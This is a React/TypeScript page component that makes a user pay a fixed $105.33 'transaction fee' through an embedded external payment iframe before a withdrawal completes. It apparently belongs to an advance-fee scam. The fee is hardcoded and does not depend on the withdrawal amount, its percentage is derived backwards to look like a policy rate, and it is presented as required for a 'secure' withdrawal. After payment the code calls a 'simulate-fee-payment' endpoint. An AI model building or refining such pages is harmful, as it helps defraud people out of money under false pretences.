import { useState, useEffect } from "react";
import { useNavigate, useParams } from "react-router-dom";
import { isAuthenticated, getUser } from "@/lib/auth";
import { apiGet, apiPost } from "@/lib/api-client";
import { Withdrawal, BalanceInfo } from "@shared/api";
import Layout from "@/components/Layout";

export default function WithdrawConfirmFee() {
  const navigate = useNavigate();
  const { withdrawalId } = useParams();
  const [withdrawal, setWithdrawal] = useState<Withdrawal | null>(null);
  const [balance, setBalance] = useState<BalanceInfo | null>(null);
  const [feePercentage, setFeePercentage] = useState(0);
  const [error, setError] = useState("");
  const [cancelling, setCancelling] = useState(false);
  const feeAmount = 105.33;

  useEffect(() => {
    if (!isAuthenticated()) {
      navigate("/");
      return;
    }

    const fetchWithdrawalData = async () => {
      try {
        const withdrawals = await apiGet<Withdrawal[]>("/api/withdrawals");
        const currentWithdrawal = withdrawals.find(w => w.id === withdrawalId);
        if (currentWithdrawal) {
          setWithdrawal(currentWithdrawal);
          const userBalance = await apiGet<BalanceInfo>("/api/balance");
          setBalance(userBalance);
          if (currentWithdrawal.amount > 0) {
            const percentage = (feeAmount / currentWithdrawal.amount) * 100;
            setFeePercentage(percentage);
          }
        } else {
          setError("Withdrawal not found.");
        }
      } catch (err) {
        setError(err instanceof Error ? err.message : "Failed to fetch withdrawal data");
      }
    };

    if (withdrawalId) {
      fetchWithdrawalData();
    }
  }, [navigate, withdrawalId]);

  const handleCancel = async () => {
    setCancelling(true);
    setError("");
    try {
      await apiPost("/api/withdrawals/cancel", { withdrawalId });
      navigate("/profile");
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to cancel withdrawal");
    } finally {
      setCancelling(false);
    }
  };

  // This function will be called by a postMessage from the iframe parent window
  const handlePaymentSuccess = async () => {
    try {
      await apiPost("/api/withdrawals/simulate-fee-payment", { withdrawalId });
      navigate(`/withdraw/success/${withdrawalId}`);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to finalize withdrawal");
    }
  };

  useEffect(() => {
    const handleIframeMessage = (event: MessageEvent) => {
      if (event.origin !== "https://go.centerpag.com") return;
      if (event.data === "paymentSuccess") {
        handlePaymentSuccess();
      }
    };

    window.addEventListener("message", handleIframeMessage);
    return () => window.removeEventListener("message", handleIframeMessage);
  }, [withdrawalId]);

  if (error) {
    return <Layout><div className="text-red-500 text-center p-8">{error}</div></Layout>;
  }

  if (!withdrawal || !balance) {
    return <Layout><div className="text-center p-8">Loading...</div></Layout>;
  }

  return (
    <Layout>
      <div className="container mx-auto max-w-4xl py-8">
        <div className="grid md:grid-cols-2 gap-8">
          <div>
            <h1 className="text-3xl font-bold mb-4">Confirm Withdrawal Fee</h1>
            <p className="text-muted-foreground mb-6">
              To complete the withdrawal securely and in accordance with our operational policies, it is necessary to pay the {feePercentage.toFixed(2)}% transaction fee.
            </p>
            <div className="border rounded-lg p-4 space-y-2">
              <div className="flex justify-between">
                <span>Withdrawal Amount:</span>
                <span className="font-semibold">${withdrawal.amount.toFixed(2)}</span>
              </div>
              <div className="flex justify-between">
                <span>Transaction Fee:</span>
                <span className="font-semibold">${feeAmount.toFixed(2)}</span>
              </div>
            </div>
            <div className="text-center mt-6">
              <button onClick={handleCancel} disabled={cancelling} className="text-sm text-gray-500 hover:underline">
                {cancelling ? "Cancelling..." : "Cancel Withdrawal"}
              </button>
            </div>
          </div>
          <div>
            <div className="aspect-w-1 aspect-h-1 h-[600px]">
              <iframe src="https://go.centerpag.com/PPU38CQ4JGM" className="w-full h-full border-0 rounded-lg" />
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}
